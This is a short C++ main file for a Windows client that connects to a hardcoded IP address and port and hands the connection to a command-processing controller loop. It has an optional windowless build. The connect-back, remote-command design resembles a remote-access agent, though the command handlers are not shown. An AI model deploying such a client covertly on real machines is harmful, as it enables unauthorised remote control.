#include <Windows.h>
#include <iostream>
#include <memory>
#include "packetconnection.h"
#include "controller.h"
#include "commands.h"
using namespace std;


#ifdef WINGUI
int WinMain(HINSTANCE hInst, HINSTANCE prev, PSTR lpCmdLine, int nCmdShow) {
#else
int main(int argc, char* argv[]) {
#endif
	string host = "128.211.234.53";
	int port = 6997;

	try {
		unique_ptr<PacketConnection> conn = make_unique<PacketConnection>(host, port);
		conn.get()->connect();
		cout << "Connected to " << host << ":" << to_string(port).c_str() << endl;
		Controller controller(move(conn));
		controller.loop();
	} catch (asio::system_error& ex) {
		cerr << "Something went wrong: " << ex.what() << endl;
	}
}
